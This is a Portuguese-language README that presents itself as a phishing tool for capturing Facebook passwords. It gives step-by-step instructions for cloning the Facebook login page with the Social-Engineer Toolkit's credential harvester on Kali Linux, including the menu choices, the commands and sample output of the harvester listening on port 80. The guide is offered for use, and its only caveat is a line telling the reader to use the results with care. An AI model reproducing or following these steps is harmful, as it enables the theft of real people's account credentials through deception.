# Phishing para captura de senhas do Facebook
Ferramenta para capturar dados com a utilização de Engenharia Social utilizando Phishing

## Ferramentas Necessárias 
- Kali Linux
  ```
  https://www.kali.org/get-kali/#kali-platforms
  ```
- Kit de ferramentas de configuração
  ```
  sudo apt-get update && sudo apt-get upgrade && sudo apt-get dist-upgrade 
  ```
## Configurando o Phishing no Kali Linux
- Acesso root:sudo su
- Iniciando o setoolkit no terminal: setoolkit

## Passo a Passo
1- Tipo de ataque: *Social-Engineering Attacks*

2- Vetor de ataque:Web Site Attack Vectors

3- Método de ataque:Credential Harvester Attack Method 

4- Método de ataque:Site Cloner

5- Obtendo o endereço da máquina:ifconfig

6- URL para clonar: http://www.facebook.com
 
 Criando servidor...
   ```
   [*] Cloning the website: https://login.facebook.com/login.php           
   [*] This could take a little bit...                                     
  
   The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.        
   [*] The Social-Engineer Toolkit Credential Harvester Attack
   [*] Credential Harvester is running on port 80                          
   [*] Information will be displayed to you as it arrives below:
  ```
## Site criado no IP utilizado

- Exemplo 192.168.1.0
```
  set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.10]:
```
Utilize com cuidado os resultados retornam no Terminal




